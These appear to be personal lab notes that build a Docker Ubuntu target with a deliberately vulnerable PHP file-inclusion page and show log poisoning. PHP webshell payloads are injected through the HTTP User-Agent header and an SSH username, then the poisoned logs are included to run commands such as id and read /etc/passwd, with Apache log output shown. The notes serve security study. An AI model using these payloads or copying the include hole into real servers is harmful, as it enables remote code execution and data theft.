# Log poisoning

```bash
# we need to create a lab using the latest version of ubuntu
docker pull ubuntu:latest

docker run -dit -p 80:80 -p 22:22 --name logPoisoning ubuntu
apt update
apt install apache2 ssh nano php -y

service apache2 start
service apache2 status

service ssh status
service ssh start

cd /var/www/html
rm index.html

<?php
    include($_GET['filename']);
?>

# http://localhost/index.php?filename=/etc/passwd
# http://localhost/index.php?filename=testing
# http://localhost/index.php?filename=idontmakemistakes

sudo docker exec -it logPoisoning bash
cd /var/log/apache2
# ans
10.88.0.1 - - [07/Sep/2025:23:27:49 -0600] "GET /index.php?filename=/etc/passwd HTTP/1.1" 200 1372 "-" "curl/8.14.1"
10.88.0.1 - - [07/Sep/2025:23:29:16 -0600] "GET / HTTP/1.1" 500 185 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:31:12 -0600] "GET /index.php?filename=/etc/passwd HTTP/1.1" 200 704 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:37:04 -0600] "GET /index.php?filename=ls HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:37:12 -0600] "GET /index.php?filename=/etc/passwd HTTP/1.1" 200 704 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:39:33 -0600] "GET /index.php?filename=testing HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:41:24 -0600] "GET /index.php?filename=idontmakemsitakes HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"

sudo docker exec -it logPoisoning bash
cd /var/log

chown www-data:www-data -R apache2

# http://localhost/index.php?filename=/var/log/apache2/access.log

# ans
10.88.0.1 - - [07/Sep/2025:23:46:08 -0600] "GET /index.php?filename=/var/log/apache2/acces.log HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:46:32 -0600] "GET /index.php?filename=/var/log/apache2/acces.log HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"

# User Agent
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36

# TEsting logs
curl -s -X GET "http://localhost/probando" -H "User-Agent: TESTING"

# ans 
10.88.0.1 - - [07/Sep/2025:23:46:32 -0600] "GET /index.php?filename=/var/log/apache2/acces.log HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:46:44 -0600] "GET /index.php?filename=/var/log/apache2/access.log HTTP/1.1" 200 703 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:50:08 -0600] "GET /probando HTTP/1.1" 404 432 "-" "TESTING"0.88.0.1 - - [07/Sep/2025:23:50:08 -0600] "GET /probando HTTP/1.1" 404 432 "-" "TESTING"

<?php system('whoami'); ?>
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"

# ans
10.88.0.1 - - [07/Sep/2025:23:46:44 -0600] "GET /index.php?filename=/var/log/apache2/access.log HTTP/1.1" 200 703 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:50:08 -0600] "GET /probando HTTP/1.1" 404 432 "-" "TESTING"
10.88.0.1 - - [07/Sep/2025:23:50:27 -0600] "GET /index.php?filename=/var/log/apache2/access.log HTTP/1.1" 200 742 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:52:53 -0600] "GET /probando HTTP/1.1" 404 432 "-" "www-data"

# Log poisoning
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# ans
10.88.0.1 - - [07/Sep/2025:23:50:27 -0600] "GET /index.php?filename=/var/log/apache2/access.log HTTP/1.1" 200 742 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:52:53 -0600] "GET /probando HTTP/1.1" 404 432 "-" "www-data
"
10.88.0.1 - - [07/Sep/2025:23:53:08 -0600] "GET /index.php?filename=/var/log/apache2/access.log HTTP/1.1" 200 766 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:59:34 -0600] "GET /probando HTTP/1.1" 404 432 "-" ""

# view-source:http://localhost/index.php?filename=/var/log/apache2/access.log&cmd=id

# ans
10.88.0.1 - - [07/Sep/2025:23:53:08 -0600] "GET /index.php?filename=/var/log/apache2/access.log HTTP/1.1" 200 766 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.88.0.1 - - [07/Sep/2025:23:59:34 -0600] "GET /probando HTTP/1.1" 404 432 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"

# USING SSH
ssh '<?php system(\$_GET["cmd"]); ?>'@172.17.0.2

# /var/log; cat btmp; echo
# view-source:localhost/index.php?filename=/var/log/btmp&cmd=cat /etc/passwd




```